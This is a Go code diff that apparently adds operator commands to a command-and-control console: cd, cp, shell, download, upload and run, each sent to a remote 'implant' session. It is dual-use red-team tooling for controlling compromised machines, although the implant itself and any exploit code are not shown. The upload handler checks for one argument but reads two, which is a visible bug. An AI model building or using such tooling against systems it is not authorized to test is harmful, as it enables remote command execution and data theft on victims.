@@ -95,3 +95,67 @@ func HandleImplantWhoami(engine *core.Engine, session *uint32, args []string) {
 func HandleImplantPs(engine *core.Engine, session *uint32, args []string) {
 	engine.ImplantPs(*session)
 }
+
+func HandleImplantCd(engine *core.Engine, session *uint32, args []string) {
+	if len(args) < 1 {
+		logger.Info("cd [path\\to\\directory]")
+		return
+	}
+
+	engine.ImplantCd(*session, args[0])
+}
+
+func HandleImplantCp(engine *core.Engine, session *uint32, args []string) {
+	if len(args) < 2 {
+		logger.Info("cp [path\\to\\src] [path\\to\\dest]")
+		return
+	}
+
+	engine.ImplantCp(*session, args[0], args[1])
+}
+
+func HandleImplantShell(engine *core.Engine, session *uint32, args []string) {
+	if len(args) < 1 {
+		logger.Info("shell \"whoami /all\"")
+		return
+	}
+
+	command := args[0]
+	for _, arg := range args[1:] {
+		command += " " + arg
+	}
+
+	engine.ImplantShell(*session, command)
+}
+
+func HandleImplantDownload(engine *core.Engine, session *uint32, args []string) {
+	if len(args) < 1 {
+		logger.Info("download [path\\to\\file]")
+		return
+	}
+
+	engine.ImplantDownload(*session, args[0])
+}
+
+func HandleImplantUpload(engine *core.Engine, session *uint32, args []string) {
+	if len(args) < 1 {
+		logger.Info("upload [path\\to\\file]")
+		return
+	}
+
+	engine.ImplantUpload(*session, args[0], args[1])
+}
+
+func HandleImplantRun(engine *core.Engine, session *uint32, args []string) {
+	if len(args) < 1 {
+		logger.Info("run [bin.exe] [args|optional]")
+		return
+	}
+
+	commandline := args[0]
+	for _, arg := range args[1:] {
+		commandline += " " + arg
+	}
+
+	engine.ImplantRun(*session, commandline)
+}
